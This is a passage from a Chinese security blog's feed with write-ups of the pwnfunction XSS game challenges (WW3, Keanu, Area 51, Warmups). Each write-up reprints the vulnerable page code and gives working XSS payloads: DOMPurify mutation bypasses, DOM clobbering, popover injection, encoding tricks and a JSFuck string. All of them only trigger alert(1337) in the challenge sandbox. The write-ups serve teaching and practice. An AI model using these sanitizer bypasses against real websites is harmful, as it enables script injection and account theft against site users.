class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是很正常的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blah</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- convert to --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blah</span>&gt;</span><span class="tag">&lt;/<span class="name">blah</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 举例：&lt;style&gt;&lt;style/&gt;Elon --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- innerHTML convert to --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- .html() convert to --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">Elon  <span class="comment">&lt;!-- 导致逃逸 --&gt;</span></span><br></pre></td></tr></table></figure><p>看回题目，img参数一路过滤，除了用来触发<code>onload</code>事件就没有太大作用，text参数是重点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text -&gt; DOMPurify.sanitize(text) -&gt; $(&apos;#notify&apos;).html(html)</span><br></pre></td></tr></table></figure><p>先要满足DOMPurify保留内容，再经过<code>.html()</code>来造成突变引发XSS。</p><p>对于后者，可以参考新闻中的案例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1337</span>);<span class="comment">//</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/images/pwnfunction/ww3/notify-convert.jpg" alt="notify-convert"></p><p>但是上述payload会被DOMPurify清空。需要往前面放置一个其他的标签来保留内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: <span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1337</span>);<span class="comment">//</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/images/pwnfunction/ww3/dompurify-and-html.jpg" alt="dompurify-and-html"></p><p>到这里就解决了text参数能够到达XSS的目的。</p><p><br></p><p>然而事情没这么简单，<code>let notify = false;</code>的存在导致<code>if(notify){...}</code>不能如预期。而脚本中又没有明显的地方可以让我们更改<code>notify</code>变量值。</p><p>这里需要考虑DOM Clobbering技巧了，毕竟<code>document.write</code>先把text写入了document中。</p><p>试过了<code>&lt;a&gt;</code>，<code>&lt;input&gt;</code>等标签的<code>id</code>属性都不行，在这里又卡了好久，翻看答案才知道这里又有一个奇怪的知识点。</p><blockquote><p>But the code that runs when the event is fired, is actually wrapped inside a function that is then later called by the browser when the event is actually fired. Along with this, browsers augment the function’s scope chain with the element itself, form(if there’s one) and also with the document object.</p></blockquote><p>当一个标签的事件被触发时，浏览器实际上会将事件属性里的内容<code>wrap</code>在一个funciton中去执行，同时在构造这个function的时候，浏览器会用元素自身、所在form以及document来构成这个function的作用域，文章<a href="https://jibbering.com/faq/names/event_handler.html" target="_blank" rel="noopener"><em>event_handler</em></a>给了个明确的代码案例。</p><p>既然document在其作用域链上，那就需要引入一个<code>document.xxx</code>能够访问到的元素才可以。</p><p>参考<a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">《使用 Dom Clobbering 扩展 XSS》</a>一文，通过<code>document.x</code>方式索引到name属性的元素是有限的，我之前试的元素都是<code>window.x</code>索引到id属性，惨:( 文中列举了5个元素标签名称。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"embed"</span>, <span class="string">"form"</span>, <span class="string">"image"</span>, <span class="string">"img"</span>, <span class="string">"object"</span>]</span><br></pre></td></tr></table></figure><p>其中<code>embed</code>和<code>object</code>会被DOMPurify过滤掉，只剩下三个可用了。至此，完整的payload也呼之欲出 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line">img  = https://i.imgur.com/PdbDexI.jpg</span><br><span class="line">text = &lt;a&gt;&lt;style&gt;&lt;style/&gt;&lt;script&gt;alert(1337);//&lt;/style&gt;&lt;form name=notify&gt;</span><br></pre></td></tr></table></figure><p>:} done.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Challenges板块Hard难度的题目 &lt;a href=&quot;https://xss.pwnfunction.com/challenges/ww3/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;WW3&lt;/a&gt;。&lt;/p&gt;
&lt;figure class=&quot;hi
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>XSS game of pwnfunction - Challenges &#39;Keanu&#39;</title>
    <link href="http://retanoj.github.io/2020/04/17/%E9%A2%98%E7%9B%AE-XSS-2020-04-17-XSS-game-of-pwnfunction-Challenges-Keanu/"/>
    <id>http://retanoj.github.io/2020/04/17/题目-XSS-2020-04-17-XSS-game-of-pwnfunction-Challenges-Keanu/</id>
    <published>2020-04-17T12:22:10.000Z</published>
    <updated>2020-04-17T13:05:51.305Z</updated>
    
    <content type="html"><![CDATA[<p>Challenges板块Medium难度的题目 <a href="https://xss.pwnfunction.com/challenges/keanu/" target="_blank" rel="noopener">Keanu</a>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">number</span> <span class="attr">id</span>=<span class="string">"number"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-primary"</span> <span class="attr">role</span>=<span class="string">"alert"</span> <span class="attr">id</span>=<span class="string">"welcome"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"keanu"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span> <span class="attr">data-toggle</span>=<span class="string">"popover"</span> <span class="attr">data-content</span>=<span class="string">"DM @PwnFunction"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">data-trigger</span>=<span class="string">"hover"</span> <span class="attr">onclick</span>=<span class="string">"alert(`If you solved it, DM me @PwnFunction :)`)"</span>&gt;</span>Solved it?<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/* Input */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> number = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'number'</span>) || <span class="string">"7"</span>)[<span class="number">0</span>],</span></span><br><span class="line"><span class="javascript">        name = DOMPurify.sanitize(<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">'name'</span>), &#123; <span class="attr">SAFE_FOR_JQUERY</span>: <span class="literal">true</span> &#125;);</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'number#number'</span>).html(number);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">'welcome'</span>).innerHTML = (<span class="string">`Welcome &lt;b&gt;<span class="subst">$&#123;name || <span class="string">"Mr. Wick"</span>&#125;</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Greet */</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#keanu'</span>).popover(<span class="string">'show'</span>)</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#keanu'</span>).popover(<span class="string">'hide'</span>)</span></span><br><span class="line">    &#125;, 2000)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> magicNumber = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">10</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> number = <span class="built_in">eval</span>($(<span class="string">'number#number'</span>).html());</span></span><br><span class="line">    if (magicNumber === number) &#123;</span><br><span class="line"><span class="javascript">        alert(<span class="string">"You're Breathtaking!"</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>乍一看，过程很繁琐。实际上，用户可控变量有两个，<code>number</code>和<code>name</code>。</p><p><code>number</code>还只接受一个字符，<code>name</code>比较自由，经过DOMPurify后会进入<code>welcome</code>标签的innerHTML。</p><p><br></p><p>由于我知道pwnfunction里有个题目是<code>Ded</code>(我就是因为这个题目才知道的pwnfunction)，里面利用popover的<code>data-content</code>来写html，触发show之后造成XSS。</p><p>这里也一样，我们可以构造一个<code>id</code>是<code>keanu</code>的标签，满足popover的条件即可。并且，不能被DOMPurify过滤掉。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"keanu"</span> <span class="attr">data-toggle</span>=<span class="string">"popover"</span> <span class="attr">data-html</span>=<span class="string">"true"</span> <span class="attr">data-content</span>=<span class="string">"&lt;h1&gt;hello&lt;/h1&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样，每次刚打开页面，自动触发<code>.popover(&#39;show&#39;)</code>，即可看到大写的hello出现。</p><p><img src="/images/pwnfunction/keanu/hello.jpg" alt="hello"></p><p>然而，在<code>data-content</code>里写XSS是不可行的。因为bootstrap对popover的content有所过滤，见<a href="https://github.com/twbs/bootstrap/blob/v4.4.1/js/src/tools/sanitizer.js" target="_blank" rel="noopener">sanitizer.js</a>.</p><p>不仅允许的标签少，允许的属性更少，不能满足XSS的条件。</p><p>之前，本以为是mXSS突变的思路，但是这里用的是DOMPurity 2.0.7，已经没有2.0.0的绕过了。</p><p>另外，<code>Ded</code>题目里用<code>&lt;form&gt;&lt;input id=attributes&gt;</code>的DOM Clobbering思路绕过sanitizer也不可行，因为sanitizer.js默认并不允许form元素。</p><p>所以，靠show来触发XSS失败了。</p><p><br></p><p>卡在这里好久，去翻了下popover的文档，发现一点内容。</p><p>popover有个属性是<code>data-container</code>，指的是将当前的popover放置到指定的html元素下（以避免样式干扰）。</p><p>如果能把用户可控内容放置到<code>number</code>下，那么<code>eval($(&#39;number#number&#39;).html());</code>这里也许可行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"keanu"</span> <span class="attr">data-container</span>=<span class="string">"number"</span> <span class="attr">data-toggle</span>=<span class="string">"popover"</span> <span class="attr">data-html</span>=<span class="string">"true"</span> <span class="attr">data-content</span>=<span class="string">"&lt;h1&gt;hello&lt;/h1&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现JS解析错误。</p><p>前面的<code>7</code>是number带入的一个字符，后面是popover移植过来的内容。当然，<code>&lt;h1&gt;hello&lt;/h1&gt;</code>也在其中。</p><p><img src="/images/pwnfunction/keanu/error.jpg" alt="error"></p><p>在这里，就要想办法进行语法满足，利用number参数引入的一个字符，和后面用户可控内容满足js语法 。</p><p>尝试了<code>&quot;</code>，<code>/</code>等字符，都会被中途截断，最后发现<code>&#39;</code>可以闭合这段字符串，条件满足。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">number = '</span><br><span class="line">name   = <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"keanu"</span> <span class="attr">data-container</span>=<span class="string">"number"</span> <span class="attr">data-toggle</span>=<span class="string">"popover"</span> <span class="attr">data-html</span>=<span class="string">"true"</span> <span class="attr">data-content</span>=<span class="string">"a';alert(1337);//"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/pwnfunction/keanu/succ.jpg" alt="error"></p><p>:} done.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Challenges板块Medium难度的题目 &lt;a href=&quot;https://xss.pwnfunction.com/challenges/keanu/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Keanu&lt;/a&gt;。&lt;/p&gt;
&lt;figure cla
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>XSS game of pwnfunction - Challenges &#39;Area 51&#39;</title>
    <link href="http://retanoj.github.io/2020/04/16/%E9%A2%98%E7%9B%AE-XSS-2020-04-16-XSS-game-of-pwnfunction-Challenges-Area-51/"/>
    <id>http://retanoj.github.io/2020/04/16/题目-XSS-2020-04-16-XSS-game-of-pwnfunction-Challenges-Area-51/</id>
    <published>2020-04-16T11:09:47.000Z</published>
    <updated>2020-04-17T13:05:42.961Z</updated>
    
    <content type="html"><![CDATA[<p>Challenges板块Easy难度的题目 <a href="https://xss.pwnfunction.com/challenges/area-51/" target="_blank" rel="noopener">Area 51</a>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=<span class="string">"pwnme"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line">    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&amp;\;\%]/g, '_');</span><br><span class="line">    <span class="keyword">var</span> template = <span class="built_in">document</span>.createElement(<span class="string">'template'</span>);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = <span class="string">"&lt;!-- &lt;p&gt; DEBUG: "</span> + template.outerHTML + <span class="string">" &lt;/p&gt; --&gt;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>接收<code>debug=</code>参数，替换了n多特殊字符后第一次传入template元素的innerHTML属性。</p><p>经过outerHTML取出后又拼接入HTML注释内，二次innerHTML到pwnme这个div元素。</p><p><br></p><p>最直接的思考就是，跳出<code>&lt;!--</code>注释，构造html标签造成XSS。</p><p>然而这里限制了不能用<code>-</code>符号。就算能用，在template内直接写<code>--&gt;</code>注释标签也会被实体转义。</p><p> <br></p><p>本以为可以找到一个html标签能提供满足条件的环境，利用编码引入<code>--&gt;</code>。尝试了<code>&lt;script&gt;</code>等标签后以失败告终。往mXSS的方向考虑后，没能查到哪个标签可以突变造成<code>&lt;!--</code>的逃逸。</p><p>看答案才知道这里有个知识点，这里的mXSS可以用<code>&lt;?php&gt;</code>或者<code>&lt;?&gt;</code>造成突变，从而逃逸注释。</p><p>测试之后发现<code>&lt;?x{0..n}&gt;</code>都可以达到效果，此后就比较顺利了，构造可XSS标签即可。</p><p><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &lt;?&gt;&lt;svg%20onload%3Dalert(1337)&gt;</span><br></pre></td></tr></table></figure><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看了答案才知道，有个非预期解是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;b title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;...&quot;&gt;</span><br></pre></td></tr></table></figure><p>不过后面出题人增加了对<code>&amp;#;</code>字符的过滤。</p><p>并且，除<code>&lt;?&gt;</code>以外，<code>&lt;!&gt;</code>和<code>&lt;/&gt;</code>在innerHTML的突变也都很有意思:)</p><p>:} done.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Challenges板块Easy难度的题目 &lt;a href=&quot;https://xss.pwnfunction.com/challenges/area-51/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Area 51&lt;/a&gt;。&lt;/p&gt;
&lt;figure c
      
    
    </summary>
    
      <category term="XSS" scheme="http://retanoj.github.io/categories/XSS/"/>
    
    
      <category term="题目" scheme="http://retanoj.github.io/tags/%E9%A2%98%E7%9B%AE/"/>
    
      <category term="XSS" scheme="http://retanoj.github.io/tags/XSS/"/>
    
      <category term="pwnfunction" scheme="http://retanoj.github.io/tags/pwnfunction/"/>
    
  </entry>
  
  <entry>
    <title>XSS game of pwnfunction - Warmups</title>
    <link href="http://retanoj.github.io/2020/04/15/%E9%A2%98%E7%9B%AE-XSS-2020-04-15-XSS-game-of-pwnfunction-Warmups/"/>
    <id>http://retanoj.github.io/2020/04/15/题目-XSS-2020-04-15-XSS-game-of-pwnfunction-Warmups/</id>
    <published>2020-04-15T11:06:42.000Z</published>
    <updated>2020-04-17T13:05:28.702Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xss.pwnfunction.com" target="_blank" rel="noopener">pwnfunction</a>网站上的XSS游戏，Warmups部分，也是比较简单的部分。</p><ul><li><h3 id="Ma-Spaghet"><a href="#Ma-Spaghet" class="headerlink" title="Ma Spaghet!"></a>Ma Spaghet!</h3></li></ul><p>签到题，没有任何过滤处理。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg/onload%3dalert(1337)%3E</span><br><span class="line"></span><br><span class="line">payload: <span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1337)</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="Jefff"><a href="#Jefff" class="headerlink" title="Jefff"></a>Jefff</h3></li></ul><p>依然签到题，没有任何过滤处理</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=%22;alert(1337)-%22</span><br><span class="line"></span><br><span class="line">payload: ";alert(1337)-"</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ugandan-Knuckles"><a href="#Ugandan-Knuckles" class="headerlink" title="Ugandan Knuckles"></a>Ugandan Knuckles</h3></li></ul><p>标签内event handler XSS。</p><p>可以在<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">XSS cheat sheet</a>找到满足条件的payload。 onfocus 和 onfocusin 均可，autofocus之后就无限弹框了。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=hello%22%20autofocus%20onfocus%3d%22alert(1337)</span><br><span class="line"></span><br><span class="line">https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=hello%22%20autofocus%20onfocusin%3d%22alert(1337)</span><br><span class="line"></span><br><span class="line">payload: hello" autofocus onfocus="alert(1337)</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ricardo-Milos"><a href="#Ricardo-Milos" class="headerlink" title="Ricardo Milos"></a>Ricardo Milos</h3></li></ul><p>form action位置XSS，可以填入URL了。action位置倒还可以做URL Redirect。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337);</span><br><span class="line"></span><br><span class="line">payload: javascript:alert(1337);</span><br></pre></td></tr></table></figure><ul><li><h3 id="Ah-That’s-Hawt"><a href="#Ah-That’s-Hawt" class="headerlink" title="Ah That’s Hawt"></a>Ah That’s Hawt</h3></li></ul><p>过滤了(，)，`和\，函数调用、编码和模板字符串都会有点限制。</p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">XSS cheat sheet</a>没有现成可用的payload，但是可以找到思路。</p><p>用编码绕过吧。html entity和uri encode都可以。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">html entity</span><br><span class="line">https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=a%3Csvg/onload%3d%22alert%26%23x28%3B1337%26%23x29%3B%22%3E</span><br><span class="line"></span><br><span class="line">payload: a%3Csvg/onload%3d%22alert%26%23x28%3B1337%26%23x29%3B%22%3E</span><br><span class="line">decode: a<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">"alert<span class="symbol">&amp;#x28;</span>1337<span class="symbol">&amp;#x29;</span>"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uri encode</span><br><span class="line">https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=a%3Ciframe/src=%27javascript:alert%25281337%2529%27%3E</span><br><span class="line"></span><br><span class="line">payload: a<span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">src</span>=<span class="string">'javascript:alert%281337%29'</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="Ligma"><a href="#Ligma" class="headerlink" title="Ligma"></a>Ligma</h3></li></ul><p>eval内不能用printable字符了。显然<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">jsfuck</a>可以干！</p><pre><code>https://sandbox.pwnfunction.com/warmups/ligma.html?balls=[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]][([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b([][[]]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b([][[]]%2b[])[%2b[]]%2b([][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[%2b!%2b[]%2b[%2b[]]]%2b(!![]%2b[])[%2b!%2b[]]]((![]%2b[])[%2b!%2b[]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]]%2b[%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]]%2b[!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[][(![]%2b[])[%2b[]]%2b([![]]%2b[][[]])[%2b!%2b[]%2b[%2b[]]]%2b(![]%2b[])[!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b[]]%2b(!![]%2b[])[!%2b[]%2b!%2b[]%2b!%2b[]]%2b(!![]%2b[])[%2b!%2b[]]])[!%2b[]%2b!%2b[]%2b[%2b[]]])()</code></pre><ul><li><h3 id="mafia"><a href="#mafia" class="headerlink" title="mafia"></a>mafia</h3></li></ul><p>50个字符内，限制大部分特殊字符的 XSS。</p><p>可以用两层eval来解。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/mafia.html?mafia=eval(/alerT(1337)/.source.toLowerCase())</span><br><span class="line"></span><br><span class="line">payload: eval(/alerT(1337)/.source.toLowerCase())</span><br></pre></td></tr></table></figure><p>还可以创建匿名函数来造成调用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sandbox.pwnfunction.com/warmups/mafia.html?mafia=Function(unescape(/aler%u0074(1337)/.source))()</span><br><span class="line"></span><br><span class="line">payload: Function(unescape(/aler%u0074(1337)/.source))()</span><br></pre></td></tr></table></figure><p>有意思的是，题目给出答案中，除了用<code>eval(location.hash.slice(1))</code>外，还用到了double dot语法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14.</span>.toString(<span class="number">10</span>)  <span class="comment">// 将数字14按10进制转成字符串</span></span><br><span class="line"><span class="number">14.0</span>.toString(<span class="number">10</span>) <span class="comment">// 这是等效的</span></span><br><span class="line">(<span class="number">14</span>).toString(<span class="number">10</span>) <span class="comment">// 这是等效的</span></span><br><span class="line"></span><br><span class="line"><span class="number">14.</span>toString(<span class="number">10</span>)   <span class="comment">// 